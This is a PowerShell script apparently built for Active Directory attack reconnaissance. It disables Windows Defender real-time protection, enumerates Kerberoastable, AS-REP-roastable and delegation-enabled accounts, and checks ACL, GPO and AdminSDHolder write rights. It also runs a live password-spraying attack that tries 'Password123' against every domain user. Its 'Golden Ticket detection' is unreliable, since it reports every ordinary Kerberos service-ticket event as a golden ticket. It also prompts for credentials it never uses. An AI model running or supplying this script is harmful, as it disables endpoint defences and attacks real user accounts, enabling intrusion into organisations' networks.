# Temporarily disable Windows Defender
function Disable-WindowsDefender {
    Write-Host "Disabling Windows Defender temporarily..." -ForegroundColor Yellow
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Host "Windows Defender has been temporarily disabled." -ForegroundColor Green
    } catch {
        Write-Host "Failed to disable Windows Defender: $_" -ForegroundColor Red
    }
}

# Collect Kerberoasting information (without Impacket)
function Invoke-KerberoastingScan {
    Write-Host "Starting Kerberoasting scan..." -ForegroundColor Yellow
    try {
        $spnAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
        if ($spnAccounts) {
            foreach ($account in $spnAccounts) {
                Write-Host "Found SPN account: $($account.SamAccountName)" -ForegroundColor Cyan
                $account.ServicePrincipalName | ForEach-Object { Write-Host "SPN: $_" -ForegroundColor Cyan }
            }
            Write-Host "Kerberoasting scan completed." -ForegroundColor Green
        } else {
            Write-Host "No SPN accounts found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Kerberoasting scan failed: $_" -ForegroundColor Red
    }
}

# Check ACL (Access Control List) for abuses (without PowerView)
function Invoke-ACLAbuseScan {
    Write-Host "Starting ACL Abuse scan..." -ForegroundColor Yellow
    try {
        $domainAdmins = Get-ADGroupMember -Identity "Domain Admins"
        foreach ($admin in $domainAdmins) {
            $acl = Get-Acl -Path "AD:\$($admin.DistinguishedName)"
            $acl.Access | ForEach-Object {
                if ($_.ActiveDirectoryRights -match 'WriteProperty') {
                    Write-Host "Potential ACL abuse detected for $($admin.SamAccountName): $($_.ActiveDirectoryRights)" -ForegroundColor Cyan
                }
            }
        }
        Write-Host "ACL Abuse scan completed." -ForegroundColor Green
    } catch {
        Write-Host "ACL Abuse scan failed: $_" -ForegroundColor Red
    }
}

# Password Spraying Attack
function Invoke-PasswordSprayingAttack {
    Write-Host "Starting Password Spraying attack..." -ForegroundColor Yellow
    try {
        $users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
        $testPassword = "Password123"
        foreach ($user in $users) {
            Write-Host "Trying password for user: $user" -ForegroundColor Cyan
            $securePassword = ConvertTo-SecureString $testPassword -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
            try {
                Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $credential -ScriptBlock { whoami } -ErrorAction Stop
                Write-Host "Successful login for user: $user" -ForegroundColor Green
            } catch {
                Write-Host "Failed login for user: $user" -ForegroundColor Red
            }
        }
    } catch {
        Write-Host "Password Spraying attack failed: $_" -ForegroundColor Red
    }
}

# Detect Golden Ticket
function Invoke-GoldenTicketDetection {
    Write-Host "Starting Golden Ticket detection..." -ForegroundColor Yellow
    try {
        $events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -MaxEvents 10 -ErrorAction SilentlyContinue
        if ($events) {
            $events | ForEach-Object { Write-Host "Golden Ticket detected: $($_.Message)" -ForegroundColor Cyan }
        } else {
            Write-Host "No Golden Ticket events found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Golden Ticket detection failed: $_" -ForegroundColor Red
    }
}

# Attack: Inactive Account Discovery
function Invoke-InactiveAccountDiscovery {
    Write-Host "Starting Inactive Account Discovery..." -ForegroundColor Yellow
    try {
        $inactiveThreshold = (Get-Date).AddDays(-90) # 90 days inactive
        $inactiveAccounts = Get-ADUser -Filter {LastLogonDate -lt $inactiveThreshold} -Properties LastLogonDate
        if ($inactiveAccounts) {
            foreach ($account in $inactiveAccounts) {
                Write-Host "Inactive account found: $($account.SamAccountName) (Last Logon: $($account.LastLogonDate))" -ForegroundColor Cyan
            }
        } else {
            Write-Host "No inactive accounts found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Inactive Account Discovery failed: $_" -ForegroundColor Red
    }
}

# Attack: GPO Abuse
function Invoke-GPOAbuse {
    Write-Host "Starting GPO Abuse scan..." -ForegroundColor Yellow
    try {
        $gpos = Get-GPO -All
        foreach ($gpo in $gpos) {
            Write-Host "Checking GPO: $($gpo.DisplayName)" -ForegroundColor Cyan
            $gpoPermissions = Get-GPPermission -Guid $gpo.Id -All
            foreach ($permission in $gpoPermissions) {
                if ($permission.Trustee.SidType -eq "User" -and $permission.Permission -eq "GpoEditDeleteModifySecurity") {
                    Write-Host "Potential GPO abuse detected: $($permission.Trustee.Name) has edit rights on $($gpo.DisplayName)" -ForegroundColor Cyan
                }
            }
        }
    } catch {
        Write-Host "GPO Abuse scan failed: $_" -ForegroundColor Red
    }
}

# Attack: AdminSDHolder Abuse
function Invoke-AdminSDHolderAbuse {
    Write-Host "Starting AdminSDHolder Abuse scan..." -ForegroundColor Yellow
    try {
        $adminSDHolder = Get-ADObject -Filter { Name -eq "AdminSDHolder" } -Properties nTSecurityDescriptor
        $acl = $adminSDHolder.nTSecurityDescriptor
        $acl.Access | ForEach-Object {
            if ($_.ActiveDirectoryRights -match 'WriteProperty') {
                Write-Host "Potential AdminSDHolder abuse detected: $($_.IdentityReference) has write rights." -ForegroundColor Cyan
            }
        }
    } catch {
        Write-Host "AdminSDHolder Abuse scan failed: $_" -ForegroundColor Red
    }
}

# Attack: AS-REP Roasting
function Invoke-ASREPRoasting {
    Write-Host "Starting AS-REP Roasting scan..." -ForegroundColor Yellow
    try {
        $asRepAccounts = Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
        if ($asRepAccounts) {
            foreach ($account in $asRepAccounts) {
                Write-Host "AS-REP Roasting vulnerable account found: $($account.SamAccountName)" -ForegroundColor Cyan
            }
        } else {
            Write-Host "No AS-REP Roasting vulnerable accounts found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "AS-REP Roasting scan failed: $_" -ForegroundColor Red
    }
}

# Attack: Unconstrained Delegation Abuse
function Invoke-UnconstrainedDelegationAbuse {
    Write-Host "Starting Unconstrained Delegation Abuse scan..." -ForegroundColor Yellow
    try {
        $unconstrainedComputers = Get-ADComputer -Filter { TrustedForDelegation -eq $true } -Properties TrustedForDelegation
        if ($unconstrainedComputers) {
            foreach ($computer in $unconstrainedComputers) {
                Write-Host "Unconstrained Delegation vulnerable computer found: $($computer.Name)" -ForegroundColor Cyan
            }
        } else {
            Write-Host "No Unconstrained Delegation vulnerable computers found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Unconstrained Delegation Abuse scan failed: $_" -ForegroundColor Red
    }
}

# Attack: Constrained Delegation Abuse
function Invoke-ConstrainedDelegationAbuse {
    Write-Host "Starting Constrained Delegation Abuse scan..." -ForegroundColor Yellow
    try {
        $constrainedAccounts = Get-ADObject -Filter { msDS-AllowedToDelegateTo -like "*" } -Properties msDS-AllowedToDelegateTo
        if ($constrainedAccounts) {
            foreach ($account in $constrainedAccounts) {
                Write-Host "Constrained Delegation vulnerable account found: $($account.Name)" -ForegroundColor Cyan
                $account.'msDS-AllowedToDelegateTo' | ForEach-Object { Write-Host "Allowed to delegate to: $_" -ForegroundColor Cyan }
            }
        } else {
            Write-Host "No Constrained Delegation vulnerable accounts found." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Constrained Delegation Abuse scan failed: $_" -ForegroundColor Red
    }
}

# Main script execution
$domainName = Read-Host "Enter the domain name"
$username = Read-Host "Enter the username"
$password = Read-Host "Enter the password" -AsSecureString

try {
    # Temporarily disable Windows Defender
    Disable-WindowsDefender

    # Gather generic AD info
    Write-Host "Gathering generic AD info..." -ForegroundColor Yellow
    Write-Host "Domain Name: $env:USERDOMAIN"
    Write-Host "DNS Domain Name: $env:USERDNSDOMAIN"
    Write-Host "Logon Server: $env:LOGONSERVER"
    Write-Host "DNS Host Name: $(hostname)"
    Write-Host "Computer Name: $(hostname)"

    # Run advanced scans
    Invoke-KerberoastingScan
    Invoke-ACLAbuseScan
    Invoke-PasswordSprayingAttack
    Invoke-GoldenTicketDetection
    Invoke-InactiveAccountDiscovery
    Invoke-GPOAbuse
    Invoke-AdminSDHolderAbuse
    Invoke-ASREPRoasting
    Invoke-UnconstrainedDelegationAbuse
    Invoke-ConstrainedDelegationAbuse

} catch {
    Write-Host "An error occurred: $_" -ForegroundColor Red
}
